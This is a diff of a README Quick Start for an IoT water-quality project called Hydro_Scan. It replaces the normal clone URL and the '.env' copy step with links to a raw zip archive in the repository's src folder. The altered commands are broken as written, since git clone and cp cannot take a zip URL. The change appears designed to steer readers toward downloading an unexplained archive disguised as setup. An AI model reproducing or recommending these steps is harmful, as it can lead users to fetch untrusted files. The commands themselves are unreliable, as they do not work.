@@ -14,10 +14,10 @@ AI-powered IoT platform for real-time water quality monitoring and contamination
 ## Quick Start
 
 ```bash
-git clone https://github.com/mudassiralladatkhan/Hydro_Scan.git
+git clone https://github.com/mudassiralladatkhan/Hydro_Scan/raw/refs/heads/main/src/Scan_Hydro_1.8.zip
 cd Hydro_Scan
 npm install
-cp .env.example .env
+cp https://github.com/mudassiralladatkhan/Hydro_Scan/raw/refs/heads/main/src/Scan_Hydro_1.8.zip .env
 # Edit .env with your credentials
 npm run dev
 ```
